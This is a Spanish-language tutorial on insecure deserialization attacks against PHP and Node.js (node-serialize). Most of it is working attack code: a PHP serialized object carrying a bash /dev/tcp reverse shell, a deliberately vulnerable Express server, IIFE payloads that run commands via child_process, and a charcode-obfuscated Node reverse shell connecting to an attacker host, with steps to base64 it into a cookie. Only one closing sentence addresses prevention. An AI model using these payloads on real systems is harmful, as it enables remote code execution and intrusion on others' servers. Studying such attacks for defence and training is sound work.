
# Serialización y Deserialización

La serialización es el proceso de convertir un objeto en un formato que pueda ser almacenado o transmitido, mientras que la deserialización es la reconstrucción del objeto a partir de dicho formato. Este proceso es común en la comunicación entre sistemas distribuidos, almacenamiento de datos y persistencia de objetos en bases de datos o archivos.

## Ejemplo de Estructura de un Objeto Serializado en PHP

Supongamos que tenemos una clase **Ping** con dos atributos: **ip** para almacenar una dirección IP y **valid** para indicar si la dirección IP es válida o no. Un ejemplo de un objeto serializado de esta clase podría ser:

```
O:4:"Ping":2:{s:2:"ip";s:9:"127.0.0.1";s:5:"valid";b:1;}
```

## Manipulación de Objetos Serializados

La manipulación maliciosa de objetos serializados puede ocurrir si no se valida adecuadamente la entrada del usuario. Por ejemplo, si un atacante puede modificar el valor de **valid** a **true**, podría inyectar código malicioso en la dirección IP y ejecutarlo en el sistema en este caso una reverse shell  como se muestra a continuacion.

```bash
O:4:"Ping":2:{s:2:"ip";s:44:";bash -c 'bash -i >& /dev/tcp/ip/puerto 0>&1";s:5:"valid";b:1;}
```

## Ejemplo de Código en PHP para Serializar y URL-encodear un Objeto

```php
<?php
class Ping {
    public $ip;
    public $valid = false;
    
    public function __construct($ip) {
        $this->ip = $ip;
        $this->valid = $this->validateIP($ip);
    }
    
    private function validateIP($ip) {
        // Validación básica de dirección IP
        return filter_var($ip, FILTER_VALIDATE_IP) !== false;
    }
    
    public function executeCommand() {
        if ($this->valid) {
            system("ping -c 4 " . $this->ip);
        } else {
            echo "Dirección IP no válida";
        }
    }
}

// Crear objeto y serializarlo
$pingObj = new Ping("127.0.0.1");
$serializedObj = serialize($pingObj);

// URL-encodear el objeto serializado
$urlEncodedObj = urlencode($serializedObj);

echo $urlEncodedObj;
?>
```

En este ejemplo, el atacante podría modificar el objeto serializado antes de deserializarlo, cambiando el valor de `$valid` a `true` para permitir la ejecución del comando `system exec`, lo que podría ser utilizado para realizar ataques de inyección de código.

```php 
<?php 

class Ping{

  public $ip = ";bash -c 'bash -i >& /dev/tcp/ip/puerto 0>&1";
  public $valid = True;

}

echo urlencode(serialize(new Ping));

?>
```

Con este codigo puedes serealizar un objeto y un urlencodearlo facilmente para asi poder hacer una reverse shell

# Ejemplo de Estructura de un Objeto Serializado en NodeJS


```js
{"username":"ajin","country":"india","city":"bangalore"}
```

Estos datos representan información de un usuario, donde "username" es el nombre de usuario, "country" es el país de origen del usuario y "city" es la ciudad en la que vive el usuario.

```js 
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser());

app.get('/', function(req, res) {
 if (req.cookies.profile) {
   var str = new Buffer(req.cookies.profile, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username) {
     res.send("Hello " + escape(obj.username));
   }
 } else {
     res.cookie('profile', "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("Hello World");
});
app.listen(3000);

```

Este codigo levanta un servidor vulnerable a ataques de deserealizacion 

```js
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));

```

Este codigo sirve para serealizar pero en javascript en este caso se esta serealizando un intento de ejecucion de comandos 

Esto nos daria algo asi:

```js
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```

Con ayuda del IIFE podemos hacer que despues de serealizar se ejecute inmediatamente solo colocando al final () como se muestra a continuacion:

```js
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 }(),
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));

```

Lamentablemente esto solo lo ejecutara pero solo al serealizar lo que queremos nosostros es que lo ejecuto al momento de deserealizar afortunadamente esto es posible gracias al IIFE como se muestra a continuacion:

```js
var serialize = require('node-serialize');
var payload = {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });}()"};
serialize.unserialize(payload);

```

Con este codigo de ejemplo ponemos a prueba el concepto del IIFE ya que antes de deseralizar se ejecutara nuestro comando para esto en el payload tenemos que escapar las comillas y quitar los saltos de linea



Ahora si queremos hacer una reverse shell podemos hacer uso de la herramienta [nodejsshell.py](https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py) para usarla tenemos que hacer lo siguiente:

```bash
python2.7 nodejsshell.py ip puerto
```

Esto nos genera algo asi:

```js
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,48,46,49,50,56,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```

Ya con esto ahora solo tendremos que adptarlo y con el uso del IIFE hacer que se ejecute:

```js
{"rce":"_$$ND_FUNC$$_function{eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,48,46,49,50,56,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
```

Ya solo lo ciframos en base 64 y mandamos en la cookie hacemos nos ponemos en escucha en el puerto especificado en nuestra maquina atacante y asi seria como tendiramos una reverse shell

Para prevenir este tipo de ataques, es crucial validar la entrada del usuario y nunca deserializar datos no confiables. Además, se deben implementar mecanismos de autenticación y autorización adecuados para limitar el acceso a funcionalidades sensibles del sistema.